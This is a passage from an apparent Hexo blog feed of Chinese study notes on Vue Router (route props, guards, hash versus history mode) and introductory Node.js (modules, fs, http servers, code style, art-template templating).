props:&#123;a:900&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件</span></span><br><span class="line"><span class="comment">// props:true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件</span></span><br><span class="line"><span class="function"><span class="title">props</span>(<span class="params">route</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line"><span class="attr">id</span>:route.query.id,</span><br><span class="line"><span class="attr">title</span>:route.query.title</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-lt-router-link-gt-的replace属性"><a href="#8-lt-router-link-gt-的replace属性" class="headerlink" title="8.&lt;router-link&gt;的replace属性"></a>8.<code>&lt;router-link&gt;</code>的replace属性</h3><ol><li>作用：控制路由跳转时操作浏览器历史记录的模式</li><li>浏览器的历史记录有两种写入方式：分别为<code>push</code>和<code>replace</code>，<code>push</code>是追加历史记录，<code>replace</code>是替换当前记录。路由跳转时候默认为<code>push</code></li><li>如何开启<code>replace</code>模式：<code>&lt;router-link replace .......&gt;News&lt;/router-link&gt;</code></li></ol><h3 id="9-编程式路由导航"><a href="#9-编程式路由导航" class="headerlink" title="9.编程式路由导航"></a>9.编程式路由导航</h3><ol><li><p>作用：不借助<code>&lt;router-link&gt; </code>实现路由跳转，让路由跳转更加灵活</p></li><li><p>具体编码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$router的两个API</span></span><br><span class="line"><span class="built_in">this</span>.$router.push(&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line"><span class="attr">params</span>:&#123;</span><br><span class="line"><span class="attr">id</span>:xxx,</span><br><span class="line"><span class="attr">title</span>:xxx</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.$router.replace(&#123;</span><br><span class="line"><span class="attr">name</span>:<span class="string">&#x27;xiangqing&#x27;</span>,</span><br><span class="line"><span class="attr">params</span>:&#123;</span><br><span class="line"><span class="attr">id</span>:xxx,</span><br><span class="line"><span class="attr">title</span>:xxx</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">this</span>.$router.forward() <span class="comment">//前进</span></span><br><span class="line"><span class="built_in">this</span>.$router.back() <span class="comment">//后退</span></span><br><span class="line"><span class="built_in">this</span>.$router.go() <span class="comment">//可前进也可后退</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="10-缓存路由组件"><a href="#10-缓存路由组件" class="headerlink" title="10.缓存路由组件"></a>10.缓存路由组件</h3><ol><li><p>作用：让不展示的路由组件保持挂载，不被销毁。</p></li><li><p>具体编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%缓存一个</span><br><span class="line">&lt;keep-alive include=&quot;News&quot;&gt; </span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br><span class="line"></span><br><span class="line">%缓存多个</span><br><span class="line">&lt;keep-alive :include=&quot;[&#x27;News&#x27;,&#x27;Message&#x27;]&quot;&gt; </span><br><span class="line">    &lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/keep-alive&gt;</span><br></pre></td></tr></table></figure></li></ol><h3 id="11-两个新的生命周期钩子"><a href="#11-两个新的生命周期钩子" class="headerlink" title="11.两个新的生命周期钩子"></a>11.两个新的生命周期钩子</h3><ol><li>作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。</li><li>具体名字：<ol><li><code>activated</code>路由组件被激活时触发。</li><li><code>deactivated</code>路由组件失活时触发。</li></ol></li></ol><h3 id="12-路由守卫"><a href="#12-路由守卫" class="headerlink" title="12.路由守卫"></a>12.路由守卫</h3><ol><li><p>作用：对路由进行权限控制</p></li><li><p>分类：全局守卫、独享守卫、组件内守卫</p></li><li><p>全局守卫:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//全局前置守卫：初始化时执行、每次路由切换前执行</span></span><br><span class="line">router.beforeEach(<span class="function">(<span class="params">to,<span class="keyword">from</span>,next</span>)=&gt;</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;beforeEach&#x27;</span>,to,<span class="keyword">from</span>)</span><br><span class="line"><span class="keyword">if</span>(to.meta.isAuth)&#123; <span class="comment">//判断当前路由是否需要进行权限控制</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;school&#x27;</span>) === <span class="string">&#x27;atguigu&#x27;</span>)&#123; <span class="comment">//权限控制的具体规则</span></span><br><span class="line">next() <span class="comment">//放行</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">alert(<span class="string">&#x27;暂无权限查看&#x27;</span>)</span><br><span class="line"><span class="comment">// next(&#123;name:&#x27;guanyu&#x27;&#125;)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">next() <span class="comment">//放行</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局后置守卫：初始化时执行、每次路由切换后执行</span></span><br><span class="line">router.afterEach(<span class="function">(<span class="params">to,<span class="keyword">from</span></span>)=&gt;</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;afterEach&#x27;</span>,to,<span class="keyword">from</span>)</span><br><span class="line"><span class="keyword">if</span>(to.meta.title)&#123; </span><br><span class="line"><span class="built_in">document</span>.title = to.meta.title <span class="comment">//修改网页的title</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">document</span>.title = <span class="string">&#x27;vue_test&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>独享守卫:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeEnter</span>(<span class="params">to,<span class="keyword">from</span>,next</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;beforeEnter&#x27;</span>,to,<span class="keyword">from</span>)</span><br><span class="line"><span class="keyword">if</span>(to.meta.isAuth)&#123; <span class="comment">//判断当前路由是否需要进行权限控制</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;school&#x27;</span>) === <span class="string">&#x27;atguigu&#x27;</span>)&#123;</span><br><span class="line">next()</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">alert(<span class="string">&#x27;暂无权限查看&#x27;</span>)</span><br><span class="line"><span class="comment">// next(&#123;name:&#x27;guanyu&#x27;&#125;)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">next()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>组件内守卫：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//进入守卫：通过路由规则，进入该组件时被调用</span></span><br><span class="line">beforeRouteEnter (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">//离开守卫：通过路由规则，离开该组件时被调用</span></span><br><span class="line">beforeRouteLeave (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="13-路由器的两种工作模式"><a href="#13-路由器的两种工作模式" class="headerlink" title="13.路由器的两种工作模式"></a>13.路由器的两种工作模式</h3><ol><li><p>对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。</p></li><li><p>hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器，即#后面的不会发给服务器。</p></li><li><p>hash模式：</p><ol><li>地址中永远带着#号，不美观 。</li><li>若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。</li><li>兼容性较好。</li></ol></li><li><p>history模式：</p><ol><li>地址干净，美观 。</li><li>兼容性和hash模式相比略差。</li><li>应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。</li></ol></li></ol><h4 id="VUE路由的hash模式与history模式的区别，这个也是面试常问的问题，这个题其实就是考验你的开发经验是否属实。"><a href="#VUE路由的hash模式与history模式的区别，这个也是面试常问的问题，这个题其实就是考验你的开发经验是否属实。" class="headerlink" title="VUE路由的hash模式与history模式的区别，这个也是面试常问的问题，这个题其实就是考验你的开发经验是否属实。"></a>VUE路由的hash模式与history模式的区别，这个也是面试常问的问题，这个题其实就是考验你的开发经验是否属实。</h4><p>小白回答：hash模式url带#号，history模式不带#号。</p><p>大牛解答：<br> 形式上：hash模式url里面永远带着#号，开发当中默认使用这个模式。如果用户考虑url的规范那么就需要使用history模式，因为history模式没有#号，是个正常的url，适合推广宣传；<br>  功能上：比如我们在开发app的时候有分享页面，那么这个分享出去的页面就是用vue或是react做的，咱们把这个页面分享到第三方的app里，有的app里面url是不允许带有#号的，所以要将#号去除那么就要使用history模式，但是使用history模式还有一个问题就是，在访问二级页面的时候，做刷新操作，会出现404错误，那么就需要和后端人配合，让他配置一下apache或是nginx的url重定向，重定向到你的首页路由上就ok了</p><p> <img src="https://gitee.com/bluebanister/image/raw/master//img/202203191036996.jpeg" alt="img"></p><h4 id="vue中的hash模式"><a href="#vue中的hash模式" class="headerlink" title="vue中的hash模式"></a>vue中的hash模式</h4><p>即地址栏 URL 中的 # 符号,这个#就是hash符号，中文名哈希符或锚点<br> 比如这个 URL：<a href="https://link.zhihu.com/?target=http://www.baidu.com/%23/home">http://www.baidu.com/#/home</a>，hash 的值为 #/home<br> 它的特点在于：hash 虽然出现在 URL 中，但不会被包括在 HTTP 请求中，对后端完全没有影响，因此改变 hash 不会重新加载页面。</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202203191037051.jpeg" alt="img"></p><p><strong>路由的哈希模式其实是利用了window.onhashchange事件，也就是说你的url中的哈希值（#后面的值）如果有变化，就会自动调用hashchange的监听事件，在hashchange的监听事件内可以得到改变后的url，这样能够找到对应页面进行加载</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;hashchange&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">   <span class="comment">// 把改变后的url地址栏的url赋值给data的响应式数据current，调用router-view去加载对应的页面</span></span><br><span class="line">   <span class="built_in">this</span>.data.current = <span class="built_in">window</span>.location.hash.substr(<span class="number">1</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="vue中history模式"><a href="#vue中history模式" class="headerlink" title="vue中history模式"></a>vue中history模式</h4><p>HTML5 History Interface  中新增的两个神器 pushState() 和 replaceState() 方法（需要特定浏览器支持），用来完成 URL  跳转而无须重新加载页面，不过这种模式还需要后台配置支持。因为我们的应用是个单页客户端应用，如果后台没有正确的配置，就需要前端自己配置404页面。</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202203191038895.jpeg" alt="preview"></p><p>pushState() 和 replaceState()  这两个神器的作用就是可以将url替换并且不刷新页面，好比挂羊头卖狗肉，http并没有去请求服务器该路径下的资源，一旦刷新就会暴露这个实际不存在的“羊头”，显示404（因为浏览器一旦刷新，就是去真正请求服务器资源）</p><p>那么如何去解决history模式下刷新报404的弊端呢，这就需要服务器端做点手脚，将不存在的路径请求重定向到入口文件（index.html），前后端联手，齐心协力做好“挂羊头卖狗肉”的完美特效  </p><p><strong>pushState方法、replaceState方法，只能导致history对象发生变化，从而改变当前地址栏的 URL，但浏览器不会向后端发送请求，也不会触发popstate事件的执行</strong> </p><p><strong>popstate事件的执行是在点击浏览器的前进后退按钮的时候，才会被触发</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;popstate&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.data.current = <span class="built_in">window</span>.location.pathname</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><p>一般场景下，hash 和 history 都可以，除非你更在意颜值，# 符号夹杂在 URL 里看起来确实有些不太美丽。  </p><p>如果不想要很丑的 hash，我们可以用路由的 history 模式，这种模式充分利用 history.pushState API 来完成URL  跳转而无须重新加载页面。 Vue-router 另外，根据 Mozilla Develop Network 的介绍，调用  history.pushState() 相比于直接修改 hash，存在以下优势:  </p><p>pushState() 设置的新 URL 可以是与当前 URL 同源的任意 URL；而 hash 只可修改 # 后面的部分，因此只能设置与当前 URL 同文档的 URL<br> pushState() 设置的新 URL 可以与当前 URL 一模一样，这样也会把记录添加到栈中；而 hash 设置的新值必须与原来不一样才会触发动作将记录添加到栈中<br> pushState() 通过 stateObject 参数可以添加任意类型的数据到记录中；而 hash 只可添加短字符串<br> pushState() 可额外设置 title 属性供后续使用  </p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>传统的路由指的是：当用户访问一个url时，对应的服务器会接收这个请求，然后解析url中的路径，从而执行对应的处理逻辑。这样就完成了一次路由分发</p><p>而前端路由是不涉及服务器的，是前端利用hash或者HTML5的history API来实现的，一般用于不同内容的展示和切换</p><p>上线选用npm run build，会生成dist文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">全称是distribution。</span><br><span class="line"></span><br><span class="line">distribution英 [dɪstrɪ&#x27;bjuːʃ(ə)n]美 [&#x27;dɪstrə&#x27;bjʊʃən]: 发行版</span><br><span class="line">n. 分布；分配</span><br><span class="line"></span><br><span class="line">在某些框架中，因为开发和发布是的内容或者代码形式是不一样的（比如利用Grunt压缩等等)，</span><br><span class="line"></span><br><span class="line">这时候就需要一个存放最终发布版本的代码，这就是dist文件夹的用处。</span><br><span class="line"></span><br><span class="line">是最终放到服务器上的发布版本。</span><br><span class="line">如果是放到开源去，一般放开发版，而不是发布版的，因为发布版通常是全部压缩优化过，不利于开源开发。</span><br><span class="line"></span><br><span class="line">dist文件夹是编译后或者压缩后的代码，终发布版本的代码</span><br><span class="line"></span><br><span class="line">src文件夹是源码文件</span><br><span class="line"></span><br><span class="line">dest文件夹为压缩包文件夹</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vue&quot;&gt;&lt;a href=&quot;#vue&quot; class=&quot;headerlink&quot; title=&quot;vue&quot;&gt;&lt;/a&gt;vue&lt;/h1&gt;&lt;h2 id=&quot;vue简介&quot;&gt;&lt;a href=&quot;#vue简介&quot; class=&quot;headerlink&quot; title=&quot;vue简介&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Nodejs</title>
    <link href="https://zengxiang21.github.io/2022/01/11/node/"/>
    <id>https://zengxiang21.github.io/2022/01/11/node/</id>
    <published>2022-01-11T12:42:19.228Z</published>
    <updated>2022-01-12T00:21:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Node-js-第1天"><a href="#Node-js-第1天" class="headerlink" title="Node.js 第1天"></a>Node.js 第1天</h1><h2 id="上午总结"><a href="#上午总结" class="headerlink" title="上午总结"></a>上午总结</h2><ul><li><p>Node.js 是什么 </p><ul><li><p>Node.js ois JavaScript runtime built on Chrome’s V8 javascript engine</p><ul><li>Chrome V8公认解析的js最快的，将引擎移植过来开发了一个独立的js开发环境</li></ul></li><li><p>JavaScript 运行时环境</p></li><li><p>既不是语言，也不是框架，它是一个平台</p></li><li><p>以前只有浏览器可以解析执行Javascript代码，现在可以脱离浏览器运行，归功于Node.js</p></li></ul></li><li><p>Node.js 中的 JavaScript</p><ul><li><strong>没有 BOM、DOM</strong></li><li>EcmaScript 基本的 JavaScript 语言部分</li><li>在 Node 中为 JavaScript 提供了一些服务器级别的 API<ul><li>文件操作的能力</li><li>http 服务的能力</li></ul></li></ul></li><li><p>Node.js特性</p><ul><li>事件驱动event-driven</li><li>非阻塞IO模型(异步) non-blocking I/O model</li><li>轻量高效 lightweight and efficient</li></ul></li><li><p>Node.js最大的安装包生态系统npm</p><ul><li>npm是世界上最大的开源库生态系统</li><li>绝大多数javascript安装包都在npm上</li><li>npm install jquery</li></ul></li><li><p>Node.js能做什么？</p><ul><li><strong>Web服务器后台</strong></li><li><strong>命令行工具</strong><ul><li>npm</li><li>git(c语言)</li><li>hexo(node)</li></ul></li></ul></li><li><p>学习到的东西</p><ul><li><p>B/S编程模型</p></li><li><p>模块化编程</p><ul><li>以前js只能通过加载script标签来加载</li><li>Node可以向@import()一样来引用加载javascript脚本文件</li></ul></li><li><p>Node常用API</p></li><li><p>异步编程</p><ul><li>Promise</li><li>async</li><li>generator</li></ul></li><li><p>Express开发框架</p></li><li><p>Ecmascript6</p></li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>Node 中的 JavaScript</p><ul><li><p>EcmaScript</p><ul><li>变量</li><li>方法</li><li>数据类型</li><li>内置对象</li><li>Array</li><li>Object</li><li>Date</li><li>Math</li></ul></li><li><p>模块系统</p><ul><li>在 Node 中没有全局作用域的概念</li><li>在 Node 中，只能通过 require 方法来加载执行多个 JavaScript 脚本文件</li><li>require 加载只能是执行其中的代码，文件与文件之间由于是模块作用域，所以不会有污染的问题<ul><li>模块完全是封闭的</li><li>外部无法访问内部</li><li>内部也无法访问外部</li></ul></li><li>模块作用域固然带来了一些好处，可以加载执行多个文件，可以完全避免变量命名冲突污染的问题</li><li>但是某些情况下，模块与模块是需要进行通信的</li><li>在每个模块中，都提供了一个对象：<code>exports</code></li><li>该对象默认是一个空对象</li><li>你要做的就是把需要被外部访问使用的成员手动的挂载到 <code>exports</code> 接口对象中</li><li>然后谁来 <code>require</code> 这个模块，谁就可以得到模块内部的 <code>exports</code> 接口对象</li><li>还有其它的一些规则，具体后面讲，以及如何在项目中去使用这种编程方式，会通过后面的案例来处理</li></ul></li><li><p>核心模块</p><ul><li>核心模块是由 Node 提供的一个个的具名的模块，服务器级别的API，它们都有自己特殊的名称标识，例如<ul><li>fs 文件操作模块</li><li>http 网络服务构建模块</li><li>os 操作系统信息模块</li><li>path 路径处理模块</li><li>。。。。</li></ul></li><li>所有核心模块在使用的时候都必须手动的先使用 <code>require</code> 方法来加载，然后才可以使用，例如：<ul><li>fs是file system，fs核心模块提供了所有文件操作相关的API</li><li><code>var fs = require(&#39;fs&#39;)</code></li><li><code>fs.readFile(&#39;path&#39;,function()&#123;&#125;)</code><ul><li>返回值两个error和data</li></ul></li></ul></li></ul></li></ul></li><li><p>http</p><p>require</p><p>端口号</p><ul><li>ip 地址定位计算机</li><li>端口号定位具体的应用程序</li></ul><p>Content-Type</p><ul><li>服务器最好把每次响应的数据是什么内容类型都告诉客户端，而且要正确的告诉</li><li>不同的资源对应的 Content-Type 是不一样，具体参照：<a href="http://tool.oschina.net/commons">http://tool.oschina.net/commons</a></li><li>对于文本类型的数据，最好都加上编码，目的是为了防止中文解析乱码问题</li></ul><p>通过网络发送文件</p><ul><li>发送的并不是文件，本质上来讲发送是文件的内容</li><li>当浏览器收到服务器响应内容之后，就会根据你的 Content-Type 进行对应的解析处理</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var http=require(&#x27;http&#x27;);</span><br><span class="line">var server=http.createServer();</span><br><span class="line">server.on(&#x27;request&#x27;, function(request,response) &#123;</span><br><span class="line">    console.log(&#x27;收到请求&#x27;);</span><br><span class="line">    response.write(&#x27;结束&#x27;);</span><br><span class="line">    response.end();</span><br><span class="line">&#125;)</span><br><span class="line">server.listen(3000,function()&#123;</span><br><span class="line">console.log(&#x27;服务器启动成功&#x27;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http=<span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> server=http.createServer();</span><br><span class="line">server.on(<span class="string">&#x27;request&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;收到请求&#x27;</span>);</span><br><span class="line">    fs.readFile(<span class="string">&#x27;./index.html&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;读取失败&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            res.setHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">            res.end(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">server.listen(<span class="number">3000</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;服务器启动成功&#x27;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>模块系统</p></li><li><p>Node 中的其它的核心模块</p></li><li><p>做一个小管理系统：</p><ul><li>CRUD</li></ul></li><li><p>Express Web 开发框架</p><ul><li><code>npm install express</code></li></ul></li></ul><h1 id="Node-js-第2天课堂笔记"><a href="#Node-js-第2天课堂笔记" class="headerlink" title="Node.js 第2天课堂笔记"></a>Node.js 第2天课堂笔记</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h2 id="反馈"><a href="#反馈" class="headerlink" title="反馈"></a>反馈</h2><ul><li>老师像我一同学 但我知道 我同学没这么牛逼。。。<ul><li>学习、分享、交流</li></ul></li><li>老师 讲讲sumblie需要安装哪些插件把 以及怎么用Md结尾的文档，对于我们来说好像就是一个阅读器一样使用………………<ul><li>HTML 也是标记语言</li><li>markdown 标记语言</li><li><code>#</code> 就是标题</li><li><code>-</code>、<code>*</code> 就是列表</li><li><code>**加粗内容**</code></li><li><code>GFM</code></li></ul></li><li>第一天上课 给我感觉挺好的 就是老师可能对早下课是不是有什么误解 我们平时都是 五点半放学的 ，还有就是有点啰嗦，那个不能起a呀b呀我感觉听了不下 五遍 我都要被你笑哭了</li><li>老师讲的挺好的</li><li>后来讲的速度有点上来了！</li><li>老师很耐心！</li><li>老师讲的课很好！</li><li>感觉老师讲的有点快，语速快</li><li>没有对比就没有伤害 体验了一把 普通话标准 英语发音又标准 幸福感</li><li>感觉老师讲课的风格简单利落，思路清晰。 nice</li><li>结尾不写分号是老师写的es6的代码风格，还是老师懒得写？</li></ul><h3 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="string">&#x27;bar&#x27;</span></span><br><span class="line"><span class="keyword">var</span> foo =<span class="string">&#x27;bar&#x27;</span></span><br><span class="line"><span class="keyword">var</span> foo= <span class="string">&#x27;bar&#x27;</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="string">&quot;bar&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;hello&#x27;</span>) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;hello&#x27;</span>) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span> )&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;hello&#x27;</span>) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了约定大家的代码风格，所以在社区中诞生了一些比较规范的代码风格规范：dnsajkndkjsabnjkdnjksandjknsajkdnjkasnjkdnjksandjknsajkdnjksajkdnas</p><ul><li><a href="https://standardjs.com/">JavaScript Standard Style</a></li><li>Airbnb JavaScript Style</li></ul><h2 id="复习"><a href="#复习" class="headerlink" title="复习"></a>复习</h2><h2 id="上午总结-1"><a href="#上午总结-1" class="headerlink" title="上午总结"></a>上午总结</h2><ul><li><p>代码风格</p></li><li><p>无分号</p><ul><li><code>(</code></li><li><code>[</code></li><li>`</li><li>最好前面补分号，避免一些问题</li><li>《编写可维护的 JavaScript》</li><li>不仅是功能，还要写的漂亮</li></ul></li><li><p>服务端渲染</p><ul><li>说白了就是在服务端使用模板引擎</li><li>模板引擎最早诞生于服务端，后来才发展到了前端</li></ul></li><li><p>服务端渲染和客户端渲染的区别</p><ul><li>客户端渲染不利于 SEO 搜索引擎优化</li><li>服务端渲染是可以被爬虫抓取到的，客户端异步渲染是很难被爬虫抓取到的</li><li>所以你会发现真正的网站既不是纯异步也不是纯服务端渲染出来的</li><li>而是两者结合来做的</li><li>例如京东的商品列表就采用的是服务端渲染，目的了为了 SEO 搜索引擎优化</li><li>而它的商品评论列表为了用户体验，而且也不需要 SEO 优化，所以采用是客户端渲染</li></ul></li></ul><h2 id="下午总结"><a href="#下午总结" class="headerlink" title="下午总结"></a>下午总结</h2><h3 id="在Node中使用模板引擎"><a href="#在Node中使用模板引擎" class="headerlink" title="在Node中使用模板引擎"></a>在Node中使用模板引擎</h3><ul><li><p>安装模板引擎</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install art-template --save</span><br></pre></td></tr></table></figure></li><li><p>引入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> template = <span class="built_in">require</span>(<span class="string">&#x27;art-template&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>核心方法</p><figure 